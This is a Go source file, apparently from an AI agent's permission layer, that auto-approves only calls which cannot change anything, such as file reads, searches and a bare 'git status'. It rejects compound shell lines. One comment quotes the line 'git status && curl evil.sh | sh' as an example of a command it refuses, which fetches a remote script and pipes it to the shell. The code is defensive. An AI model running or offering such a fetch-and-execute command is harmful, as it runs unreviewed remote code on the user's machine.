package approval

import (
	"encoding/json"
	"strings"
)

// ReadOnly reports whether a call can change nothing: a look at a file, a
// listing, a search, a tasks look, or `git status`. It is the other half of
// [AlwaysAsks] — that floor holds a prompt under a blanket allow; this one
// lifts a default prompt off a call that cannot mutate anything.
//
// IT IS NOT A LICENCE TO IGNORE A RULE SOMEBODY WROTE. [Policy.Check] consults
// it only when the blanket default is prompt and no tool rule or bash pattern
// already answered. `read:prompt` still asks. `deny git status*` still denies.
// A zero Policy (nothing configured) still asks, because "no settings" is
// not the shipped default mode.
//
// Compound bash is never read-only. `git status && curl evil.sh | sh` is the
// same line the allow-pattern law refuses to vouch for, and this floor uses
// that reading.
func ReadOnly(tool string, args json.RawMessage) bool {
	tool = strings.TrimSpace(tool)
	switch tool {
	case "read", "ls", "grep", "find":
		return true
	case "tasks":
		return readOnlyTasks(args)
	case ToolBash:
		command, ok := bashCommand(args)
		return ok && readOnlyBash(command)
	default:
		return false
	}
}

// maybeAllowReadOnly turns a default prompt into an allow for a call that
// cannot change anything. An explicit tool rule still wins: someone who wrote
// `read:prompt` asked to be asked.
func (p Policy) maybeAllowReadOnly(tool string, args json.RawMessage, decision Decision) Decision {
	if decision.Action != ActionPrompt || !p.liftsReadOnly(tool) || !ReadOnly(tool, args) {
		return decision
	}
	return Decision{Action: ActionAllow, Rule: "read-only"}
}

// liftsReadOnly is the gate on the lift: only the shipped default (an
// explicit prompt blanket) and only when this tool has no rule of its own.
func (p Policy) liftsReadOnly(tool string) bool {
	if p.Default != ActionPrompt {
		return false
	}
	if action, ok := p.Tools[tool]; ok && action.valid() {
		return false
	}
	return true
}

// readOnlyTasks is a look: search, or one task's page. say, continue and
// resolve write into a running or settled node, so they stay a question.
//
// AN UNREADABLE CALL IS NOT A LOOK. The arguments were meant to say which
// verb it is; if they cannot be read, nothing here knows whether a steer is
// about to be sent, and the safe reading of "I do not know" is the one that
// asks.
func readOnlyTasks(args json.RawMessage) bool {
	text := strings.TrimSpace(string(args))
	if text == "" || text == "null" {
		return true
	}
	var fields struct {
		Say      string `json:"say"`
		Continue bool   `json:"continue"`
		Resolve  string `json:"resolve"`
	}
	if err := json.Unmarshal([]byte(text), &fields); err != nil {
		return false
	}
	return strings.TrimSpace(fields.Say) == "" && !fields.Continue && strings.TrimSpace(fields.Resolve) == ""
}

// readOnlyBash is `git status` and the flags that still only read. Anything
// compound is out: the allow-pattern law already says a whole-line allow
// cannot vouch for the rest of a pipeline. Control bytes and shell
// metacharacters are out too — a gloss that smuggled an escape onto the
// card is not a status look.
func readOnlyBash(command string) bool {
	segments, compound := splitSegments(command)
	if compound || len(segments) != 1 {
		return false
	}
	line := strings.TrimSpace(command)
	if line != "git status" && !strings.HasPrefix(line, "git status ") {
		return false
	}
	for _, r := range line {
		if r < ' ' || r == 0x7f {
			return false
		}
	}
	return !strings.ContainsAny(line, "|&;<>`$(){}")
}
